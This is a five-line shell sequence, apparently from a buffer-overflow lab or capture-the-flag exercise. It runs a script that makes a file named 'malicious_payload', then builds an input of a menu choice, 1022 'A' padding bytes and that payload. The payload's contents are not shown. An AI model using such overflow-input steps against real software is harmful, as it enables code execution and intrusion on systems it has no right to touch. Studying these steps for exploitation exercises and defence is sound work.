python ./buf_code.py
wc -c malicious_payload 
python -c 'import sys; sys.stdout.write("2\n"+"A"*1022)' > payload_search
cat malicious_payload >> payload_search
cat payload_search

